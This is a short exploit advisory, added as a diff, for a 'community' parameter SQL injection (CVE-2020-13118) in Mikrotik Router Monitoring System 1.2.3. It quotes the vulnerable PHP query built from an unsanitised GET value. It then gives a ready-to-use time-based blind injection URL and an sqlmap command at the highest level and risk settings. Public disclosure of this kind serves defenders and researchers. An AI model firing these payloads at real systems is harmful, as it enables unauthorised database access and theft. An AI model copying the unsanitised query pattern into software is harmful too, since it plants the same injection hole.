@@ -1,0 +1,22 @@
+# Exploit Title: Mikrotik Router Monitoring System 1.2.3 - 'community' SQL Injection
+# Exploit Author: jul10l1r4 (Julio Lira)
+# Google Dork: N/A
+# Date: 2020-05-16
+# Vendor Homepage: https://mikrotik.com
+# Software Link: https://mikrotik.com/download
+# Version: <= 1.2.3
+# Tested on: Debian 10 buster
+# CVE: 2020-13118
+Description: SQL Injection found in check_community.php:49
+
+$community = $_GET['community'];
+$_SESSION['community'] = $community;
+$query = "SELECT name from router where `community`='
+$community'";
+
+PoC:
+
+http://localhost/check_community.php?community=1' AND (SELECT 6941 FROM (SELECT(SLEEP(10)))Qaxg) AND 'sdHI'='sdHI
+
+SQLmap using:
+sqlmap -u 'http://localhost/check_community.php?community=1' --level=5 --risk=3
